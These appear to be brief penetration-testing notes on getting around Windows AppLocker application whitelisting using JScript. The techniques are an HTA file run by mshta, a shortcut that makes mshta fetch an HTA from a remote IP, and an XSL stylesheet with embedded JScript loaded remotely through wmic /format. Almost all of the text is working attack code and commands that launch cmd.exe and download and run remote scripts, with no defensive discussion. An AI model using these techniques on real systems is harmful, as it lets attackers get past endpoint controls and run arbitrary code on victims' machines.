# Bypassing AppLocker with JScript

## JScript and MSHTA

**Proof of concept HTA file**

```html
<html> 
<head> 
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

**Execute HTA File**

```powershell
mshta C:\Tools\test.hta
```

**Create a shortcut file**

```powershell
# Set path to be the below
C:\Windows\System32\mshta.exe http://192.168.49.79/test.hta
```

## XSL Transform

**Proof of concept XSL file that will open cmd.exe**

```xml
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		]]>
	</ms:script>
</stylesheet>
```

**WMIC is used to trigger the XSL transform**

```powershell
wmic process get brief /format:"http://192.168.49.72/test.xsl"
```
